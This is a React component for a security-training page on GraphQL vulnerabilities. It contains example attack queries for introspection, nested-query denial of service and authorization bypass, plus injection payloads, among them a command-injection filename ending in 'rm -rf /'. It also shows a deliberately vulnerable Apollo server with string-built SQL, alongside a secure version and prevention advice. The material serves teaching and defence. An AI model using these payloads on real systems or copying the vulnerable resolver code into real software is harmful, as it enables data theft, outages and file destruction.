
import React from 'react';
import { Database } from 'lucide-react';
import CodeExample from '@/components/CodeExample';

const GraphQLVulnerabilities: React.FC = () => {
  return (
    <section id="graphql" className="scroll-mt-20">
      <h3 className="text-2xl font-bold mb-6 border-b-2 border-cybr-primary inline-block pb-2">GraphQL Vulnerabilities</h3>
      
      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Attack Overview</h4>
        <p className="mb-4">
          GraphQL is a query language and runtime for APIs that enables clients to request exactly the data they need.
          While powerful and flexible, GraphQL introduces unique security concerns that differ from traditional REST APIs.
          Attackers target GraphQL implementations to extract sensitive data, cause denial of service, bypass authentication,
          and exploit injection vulnerabilities through the query structure itself.
        </p>
        
        <div className="bg-cybr-muted/20 p-4 rounded-lg mb-6">
          <h5 className="text-lg font-medium mb-3">What Attackers Try to Achieve</h5>
          <ul className="list-disc pl-6 space-y-2">
            <li><strong>Information Disclosure:</strong> Extract schema details and sensitive data through introspection</li>
            <li><strong>Denial of Service:</strong> Overload servers with complex, deeply nested queries</li>
            <li><strong>Authentication Bypass:</strong> Access unauthorized data through insufficient field-level controls</li>
            <li><strong>Data Exfiltration:</strong> Retrieve large datasets through batched queries and aliases</li>
            <li><strong>Injection Attacks:</strong> Execute malicious code through unsanitized resolver inputs</li>
          </ul>
        </div>

        <div className="bg-cybr-muted/20 p-4 rounded-lg mb-6">
          <h5 className="text-lg font-medium mb-3">Commonly Vulnerable Components</h5>
          <ul className="list-disc pl-6 space-y-2">
            <li><strong>GraphQL Endpoints:</strong> Main query endpoint accepting POST requests</li>
            <li><strong>Resolvers:</strong> Functions that fetch data for each field in the schema</li>
            <li><strong>Schema Introspection:</strong> Built-in queries that reveal API structure</li>
            <li><strong>Subscription Endpoints:</strong> Real-time data streams via WebSockets</li>
            <li><strong>GraphQL Playground/GraphiQL:</strong> Development interfaces exposed in production</li>
          </ul>
        </div>
      </div>

      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Why GraphQL Attacks Work</h4>
        <ul className="list-disc pl-6 space-y-3 mb-6">
          <li><strong>Flexible Query Structure:</strong> Clients can construct complex queries that weren't anticipated by developers</li>
          <li><strong>Single Endpoint:</strong> All operations go through one URL, making it harder to apply specific security controls</li>
          <li><strong>Introspection by Default:</strong> Many implementations expose schema details in production</li>
          <li><strong>Inadequate Rate Limiting:</strong> Traditional HTTP-based rate limiting doesn't account for query complexity</li>
          <li><strong>Field-Level Authorization Gaps:</strong> Developers often focus on endpoint security rather than individual field access</li>
          <li><strong>Resolver Trust:</strong> Resolvers may trust input data without proper validation or sanitization</li>
        </ul>
      </div>

      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Common Attack Vectors & Payloads</h4>
        
        <h5 className="text-lg font-medium mb-3">1. Schema Introspection Attack</h5>
        <CodeExample 
          language="graphql" 
          isVulnerable={true}
          title="Introspection Query to Extract Schema" 
          code={`# Full schema introspection
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type { ...TypeRef }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}`} 
        />

        <h5 className="text-lg font-medium mb-3 mt-6">2. Denial of Service Attacks</h5>
        <CodeExample 
          language="graphql" 
          isVulnerable={true}
          title="Deeply Nested Query Attack" 
          code={`# Deeply nested query causing exponential resource consumption
query NestedBombQuery {
  posts {
    comments {
      author {
        posts {
          comments {
            author {
              posts {
                comments {
                  author {
                    posts {
                      comments {
                        author {
                          posts {
                            # This can go much deeper...
                            title
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}

# Query with aliases to multiply requests
query AliasAttack {
  posts1: posts { title content }
  posts2: posts { title content }
  posts3: posts { title content }
  posts4: posts { title content }
  posts5: posts { title content }
  # Can repeat hundreds of times...
}

# Circular query attack
query CircularQuery {
  user(id: "1") {
    friends {
      friends {
        friends {
          friends {
            friends {
              # Circular references can cause infinite loops
              name
            }
          }
        }
      }
    }
  }
}`} 
        />

        <h5 className="text-lg font-medium mb-3 mt-6">3. Authorization Bypass</h5>
        <CodeExample 
          language="graphql" 
          isVulnerable={true}
          title="Field-Level Authorization Bypass" 
          code={`# Accessing sensitive fields through nested queries
query SensitiveDataExtraction {
  posts {
    title
    author {
      # These fields might not have proper authorization
      email
      phone
      ssn
      creditCard
      internalNotes
    }
  }
}

# Batch query to extract multiple users' data
query BatchUserExtraction {
  user1: user(id: "1") { email phone }
  user2: user(id: "2") { email phone }
  user3: user(id: "3") { email phone }
  # Continue for many users...
}

# Using fragments to hide malicious queries
fragment UserDetails on User {
  id
  name
  # Hidden sensitive fields
  password
  apiKey
  internalId
}

query InnocuousLooking {
  users {
    ...UserDetails
  }
}`} 
        />

        <h5 className="text-lg font-medium mb-3 mt-6">4. Injection Attacks</h5>
        <CodeExample 
          language="graphql" 
          isVulnerable={true}
          title="GraphQL Injection Payloads" 
          code={`# SQL Injection through GraphQL resolver
query SQLInjectionAttack {
  user(id: "1' OR '1'='1") {
    name
    email
  }
}

# NoSQL Injection
query NoSQLInjection {
  posts(filter: "{\"author\": {\"$ne\": null}}") {
    title
    content
  }
}

# Server-Side Template Injection
query SSTIAttack {
  search(query: "{{7*7}}") {
    results
  }
}

# Command Injection
mutation FileUpload {
  uploadFile(filename: "test.txt; rm -rf /") {
    success
  }
}`} 
        />
      </div>

      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Step-by-Step Exploitation Process</h4>
        
        <div className="bg-cybr-muted/10 p-6 rounded-lg mb-6">
          <h5 className="text-lg font-medium mb-4">Phase 1: Discovery & Reconnaissance</h5>
          <ol className="list-decimal pl-6 space-y-2">
            <li><strong>Identify GraphQL Endpoint:</strong> Look for /graphql, /graphiql, /api/graphql paths</li>
            <li><strong>Check for GraphQL Playground:</strong> Access GraphiQL or GraphQL Playground interfaces</li>
            <li><strong>Test Basic Queries:</strong> Send simple queries to confirm GraphQL is active</li>
            <li><strong>Enumerate HTTP Methods:</strong> Test GET and POST methods with different content types</li>
          </ol>
        </div>

        <div className="bg-cybr-muted/10 p-6 rounded-lg mb-6">
          <h5 className="text-lg font-medium mb-4">Phase 2: Schema Discovery</h5>
          <ol className="list-decimal pl-6 space-y-2">
            <li><strong>Test Introspection:</strong> Send introspection queries to extract full schema</li>
            <li><strong>Analyze Available Types:</strong> Review all queries, mutations, and subscriptions</li>
            <li><strong>Identify Sensitive Fields:</strong> Look for fields containing PII, credentials, or internal data</li>
            <li><strong>Map Field Relationships:</strong> Understand how types connect to find traversal paths</li>
          </ol>
        </div>

        <div className="bg-cybr-muted/10 p-6 rounded-lg mb-6">
          <h5 className="text-lg font-medium mb-4">Phase 3: Vulnerability Testing</h5>
          <ol className="list-decimal pl-6 space-y-2">
            <li><strong>Test Query Depth Limits:</strong> Send increasingly deep nested queries</li>
            <li><strong>Check Rate Limiting:</strong> Send rapid-fire queries and batched requests</li>
            <li><strong>Test Authorization:</strong> Try accessing fields without proper authentication</li>
            <li><strong>Injection Testing:</strong> Submit malicious payloads in query variables</li>
            <li><strong>Error Information:</strong> Analyze error messages for information disclosure</li>
          </ol>
        </div>

        <div className="bg-cybr-muted/10 p-6 rounded-lg mb-6">
          <h5 className="text-lg font-medium mb-4">Phase 4: Exploitation</h5>
          <ol className="list-decimal pl-6 space-y-2">
            <li><strong>Data Extraction:</strong> Use discovered vulnerabilities to extract sensitive information</li>
            <li><strong>DoS Attacks:</strong> Launch resource exhaustion attacks using complex queries</li>
            <li><strong>Privilege Escalation:</strong> Exploit authorization bypasses for elevated access</li>
            <li><strong>Lateral Movement:</strong> Use extracted credentials or data for further attacks</li>
          </ol>
        </div>
      </div>

      <CodeExample 
        language="javascript" 
        isVulnerable={true}
        title="Vulnerable GraphQL Server Implementation" 
        code={`const { ApolloServer, gql } = require('apollo-server-express');

// Vulnerable GraphQL schema exposing sensitive data
const typeDefs = gql\`
  type User {
    id: ID!
    username: String!
    email: String!
    password: String!  # Exposed password field
    creditCard: String
    ssn: String
    isAdmin: Boolean!
    apiKey: String     # Exposed API key
  }

  type Post {
    id: ID!
    title: String!
    content: String!
    author: User!      # Unrestricted user access
  }

  type Query {
    users: [User]      # No authentication required
    user(id: ID!): User
    posts: [Post]
    searchUsers(query: String!): [User]
  }

  type Mutation {
    updateUser(id: ID!, data: String!): User
  }
\`;

// Vulnerable resolvers with no security controls
const resolvers = {
  Query: {
    // No authentication check - exposes all users
    users: () => {
      return getAllUsers(); // Includes sensitive data
    },
    
    // SQL injection vulnerability
    user: (_, { id }) => {
      // Direct SQL query without parameterization
      return db.query(\`SELECT * FROM users WHERE id = '\${id}'\`);
    },
    
    // No input validation or sanitization
    searchUsers: (_, { query }) => {
      // Vulnerable to NoSQL injection
      return db.users.find(JSON.parse(query));
    }
  },
  
  Mutation: {
    // No authorization check for updates
    updateUser: (_, { id, data }) => {
      // Server-side template injection possible
      const template = \`User \${id} updated with: \${data}\`;
      return processTemplate(template);
    }
  }
};

// Insecure server configuration
const server = new ApolloServer({ 
  typeDefs, 
  resolvers,
  // Dangerous settings for production
  playground: true,          // Exposed in production
  introspection: true,       // Schema exposed
  debug: true,               // Detailed errors
  // No query complexity limits
  // No depth limits
  // No rate limiting
  // No authentication context
});`} 
      />

      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Testing Tools & Techniques</h4>
        
        <div className="grid md:grid-cols-2 gap-6 mb-6">
          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="text-lg font-medium mb-3">Automated Tools</h5>
            <ul className="list-disc pl-6 space-y-1 text-sm">
              <li><strong>GraphQL Voyager:</strong> Schema visualization</li>
              <li><strong>InQL:</strong> Burp Suite extension for GraphQL testing</li>
              <li><strong>GraphQLmap:</strong> Automated GraphQL endpoint discovery</li>
              <li><strong>Altair:</strong> GraphQL client for testing</li>
              <li><strong>GraphQL Cop:</strong> Security auditing tool</li>
            </ul>
          </div>
          
          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="text-lg font-medium mb-3">Manual Testing Tools</h5>
            <ul className="list-disc pl-6 space-y-1 text-sm">
              <li><strong>Burp Suite:</strong> Intercept and modify GraphQL requests</li>
              <li><strong>Postman:</strong> GraphQL query collection and testing</li>
              <li><strong>GraphiQL:</strong> Interactive GraphQL explorer</li>
              <li><strong>Insomnia:</strong> REST/GraphQL client</li>
              <li><strong>curl:</strong> Command-line testing</li>
            </ul>
          </div>
        </div>

        <div className="bg-cybr-muted/10 p-6 rounded-lg mb-6">
          <h5 className="text-lg font-medium mb-4">Step-by-Step Testing Methodology</h5>
          <ol className="list-decimal pl-6 space-y-3">
            <li>
              <strong>Endpoint Discovery:</strong>
              <ul className="list-disc pl-6 mt-1 space-y-1">
                <li>Scan for common GraphQL paths: /graphql, /api/graphql, /v1/graphql</li>
                <li>Check for GraphQL playground interfaces</li>
                <li>Look for WebSocket endpoints for subscriptions</li>
              </ul>
            </li>
            <li>
              <strong>Introspection Testing:</strong>
              <ul className="list-disc pl-6 mt-1 space-y-1">
                <li>Send introspection queries to extract schema</li>
                <li>Analyze available queries, mutations, and types</li>
                <li>Identify sensitive or interesting fields</li>
              </ul>
            </li>
            <li>
              <strong>Query Complexity Testing:</strong>
              <ul className="list-disc pl-6 mt-1 space-y-1">
                <li>Test depth limits with nested queries</li>
                <li>Try alias-based multiplication attacks</li>
                <li>Test circular reference handling</li>
              </ul>
            </li>
            <li>
              <strong>Authorization Testing:</strong>
              <ul className="list-disc pl-6 mt-1 space-y-1">
                <li>Test field-level access controls</li>
                <li>Try accessing admin-only fields</li>
                <li>Test horizontal privilege escalation</li>
              </ul>
            </li>
            <li>
              <strong>Injection Testing:</strong>
              <ul className="list-disc pl-6 mt-1 space-y-1">
                <li>Test SQL injection in query parameters</li>
                <li>Try NoSQL injection payloads</li>
                <li>Test for SSTI in resolver inputs</li>
              </ul>
            </li>
          </ol>
        </div>
      </div>

      <CodeExample 
        language="javascript" 
        isVulnerable={false}
        title="Secure GraphQL Implementation" 
        code={`const { ApolloServer } = require('apollo-server-express');
const { depthLimit } = require('graphql-depth-limit');
const { createComplexityLimitRule } = require('graphql-validation-complexity');
const { shield, rule, and, or } = require('graphql-shield');

// Secure schema with proper field restrictions
const typeDefs = gql\`
  type User {
    id: ID!
    username: String!
    email: String!
    # Sensitive fields removed from schema
    isAdmin: Boolean!
  }

  type Post {
    id: ID!
    title: String!
    content: String!
    author: User!
  }

  type Query {
    # Authentication required for user queries
    me: User
    posts: [Post]
    user(id: ID!): User
  }

  type Mutation {
    updateProfile(input: UpdateProfileInput!): User
  }

  input UpdateProfileInput {
    username: String
    email: String
  }
\`;

// Authorization rules
const isAuthenticated = rule({ cache: 'contextual' })(
  async (parent, args, context) => {
    return context.user !== null;
  }
);

const isOwner = rule({ cache: 'strict' })(
  async (parent, args, context) => {
    return context.user && context.user.id === args.id;
  }
);

const isAdmin = rule({ cache: 'contextual' })(
  async (parent, args, context) => {
    return context.user && context.user.isAdmin === true;
  }
);

// GraphQL Shield permissions
const permissions = shield({
  Query: {
    me: isAuthenticated,
    user: or(isOwner, isAdmin),
    posts: isAuthenticated,
  },
  Mutation: {
    updateProfile: isAuthenticated,
  },
  User: {
    email: or(isOwner, isAdmin), // Field-level protection
  }
});

// Secure resolvers with proper validation
const resolvers = {
  Query: {
    me: (_, __, context) => {
      // Always return current user data
      return getUserById(context.user.id);
    },
    
    user: async (_, { id }, context) => {
      // Parameterized query to prevent SQL injection
      const user = await db.query(
        'SELECT id, username, email, isAdmin FROM users WHERE id = $1',
        [id]
      );
      return user;
    },
    
    posts: async (_, __, context) => {
      // Secure database query
      return await db.posts.findMany({
        where: { published: true },
        include: { author: true }
      });
    }
  },
  
  Mutation: {
    updateProfile: async (_, { input }, context) => {
      // Input validation
      const { error } = updateProfileSchema.validate(input);
      if (error) throw new UserInputError('Invalid input');
      
      // Sanitize input data
      const sanitizedInput = sanitizeInput(input);
      
      // Update with user context
      return await db.users.update({
        where: { id: context.user.id },
        data: sanitizedInput
      });
    }
  }
};

// Secure server configuration
const server = new ApolloServer({
  typeDefs,
  resolvers,
  // Apply security middleware
  middlewares: [permissions],
  
  // Security configurations
  introspection: process.env.NODE_ENV !== 'production',
  playground: process.env.NODE_ENV !== 'production',
  
  // Query complexity and depth limiting
  validationRules: [
    depthLimit(10), // Maximum query depth
    createComplexityLimitRule(1000, {
      maximumCost: 1000,
      scalarCost: 1,
      objectCost: 2,
      listFactor: 10,
      introspectionCost: 1000,
    })
  ],
  
  // Authentication context
  context: async ({ req }) => {
    let user = null;
    const token = req.headers.authorization?.replace('Bearer ', '');
    
    if (token) {
      try {
        const payload = jwt.verify(token, process.env.JWT_SECRET);
        user = await getUserById(payload.userId);
      } catch (error) {
        // Invalid token - continue with null user
      }
    }
    
    return { user };
  },
  
  // Secure error handling
  formatError: (error) => {
    // Log error internally
    console.error('GraphQL Error:', error);
    
    // Return sanitized error to client
    if (process.env.NODE_ENV === 'production') {
      return {
        message: 'An error occurred during execution',
        code: error.extensions?.code || 'INTERNAL_ERROR'
      };
    }
    
    return error;
  },
  
  // Request timeout
  plugins: [
    {
      requestDidStart() {
        return {
          willSendResponse(requestContext) {
            // Add security headers
            requestContext.response.http.headers.set(
              'X-Content-Type-Options', 'nosniff'
            );
            requestContext.response.http.headers.set(
              'X-Frame-Options', 'DENY'
            );
          }
        };
      }
    }
  ]
});

// Additional security measures
app.use('/graphql', rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // Limit each IP to 100 requests per windowMs
  message: 'Too many requests from this IP'
}));`} 
      />

      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Prevention Strategies</h4>
        
        <div className="grid md:grid-cols-2 gap-6 mb-6">
          <div className="bg-green-900/20 p-4 rounded-lg border border-green-500/20">
            <h5 className="text-lg font-medium mb-3 text-green-400">Schema Security</h5>
            <ul className="list-disc pl-6 space-y-1 text-sm">
              <li>Disable introspection in production</li>
              <li>Remove sensitive fields from schema</li>
              <li>Use field-level authorization</li>
              <li>Implement proper input validation</li>
              <li>Sanitize all resolver inputs</li>
            </ul>
          </div>
          
          <div className="bg-green-900/20 p-4 rounded-lg border border-green-500/20">
            <h5 className="text-lg font-medium mb-3 text-green-400">Query Protection</h5>
            <ul className="list-disc pl-6 space-y-1 text-sm">
              <li>Implement query depth limiting</li>
              <li>Add query complexity analysis</li>
              <li>Set request timeouts</li>
              <li>Use query allowlisting</li>
              <li>Implement proper rate limiting</li>
            </ul>
          </div>
        </div>

        <div className="bg-green-900/20 p-4 rounded-lg border border-green-500/20 mb-6">
          <h5 className="text-lg font-medium mb-3 text-green-400">Development Environment Considerations</h5>
          <ul className="list-disc pl-6 space-y-2 text-sm">
            <li><strong>Node.js:</strong> Use libraries like graphql-shield, graphql-depth-limit, and graphql-query-complexity</li>
            <li><strong>Python:</strong> Implement custom validation with graphene or strawberry frameworks</li>
            <li><strong>Java:</strong> Use GraphQL Java with custom instrumentation for security</li>
            <li><strong>PHP:</strong> Implement security middleware with Lighthouse or webonyx/graphql-php</li>
            <li><strong>Ruby:</strong> Use GraphQL-Ruby with custom analyzers and middleware</li>
            <li><strong>.NET:</strong> Implement security policies with Hot Chocolate or GraphQL.NET</li>
          </ul>
        </div>
      </div>

      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Special Cases & Advanced Scenarios</h4>
        
        <div className="space-y-6">
          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="text-lg font-medium mb-3">Federation & Microservices</h5>
            <p className="text-sm mb-2">
              GraphQL federation introduces additional security challenges when multiple services compose a single schema.
              Each service must implement consistent security policies, and the gateway needs to handle cross-service authorization.
            </p>
            <ul className="list-disc pl-6 space-y-1 text-sm">
              <li>Implement consistent authentication across all services</li>
              <li>Use gateway-level rate limiting and query analysis</li>
              <li>Ensure proper error handling doesn't leak service details</li>
              <li>Implement distributed tracing for security monitoring</li>
            </ul>
          </div>

          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="text-lg font-medium mb-3">Subscription Security</h5>
            <p className="text-sm mb-2">
              GraphQL subscriptions use WebSockets and can be exploited for DoS attacks or unauthorized data access.
              They require special consideration for authentication and resource management.
            </p>
            <ul className="list-disc pl-6 space-y-1 text-sm">
              <li>Authenticate WebSocket connections properly</li>
              <li>Implement subscription-specific rate limiting</li>
              <li>Limit the number of concurrent subscriptions per user</li>
              <li>Use heartbeat mechanisms to detect abandoned connections</li>
            </ul>
          </div>

          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="text-lg font-medium mb-3">File Upload Security</h5>
            <p className="text-sm mb-2">
              GraphQL file uploads through multipart requests can introduce additional vulnerabilities
              including path traversal, malware upload, and resource exhaustion.
            </p>
            <ul className="list-disc pl-6 space-y-1 text-sm">
              <li>Validate file types and sizes strictly</li>
              <li>Scan uploaded files for malware</li>
              <li>Store files outside the web root</li>
              <li>Implement proper access controls for uploaded content</li>
            </ul>
          </div>
        </div>
      </div>
    </section>
  );
};

export default GraphQLVulnerabilities;
